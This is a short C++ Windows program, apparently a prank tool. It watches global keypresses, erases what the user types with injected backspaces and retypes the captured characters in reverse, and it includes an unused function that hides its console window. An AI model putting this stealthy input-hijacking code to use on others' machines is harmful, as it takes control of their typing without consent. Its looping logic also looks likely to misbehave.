#include <iostream>
#define WINVER 0x0500
#include <windows.h>
#include <Winuser.h>
#include <cstring>
using namespace std;
void hide()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}
void presskey(int k)
{
    INPUT ip;
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
    ip.ki.wVk = k;
    ip.ki.dwFlags = 0;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
}
int main()
{
    //hide();
    string x = "";
    char c;
    while(1)
    {
        for(int i=8;i<=190;i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                presskey(8); //backspace
                for(int j=0;j<x.length();j++)
                {
                    presskey(8);
                }
                x = char(i) + x;
                for(int k=0;k<x.length();k++)
                {
                    presskey(int(x[k]));
                }
            }
        }
    }
    //HKL cc = GetKeyboardLayout(0);
    //cout<<VkKeyScanEx('a',cc);
    return 0;
}
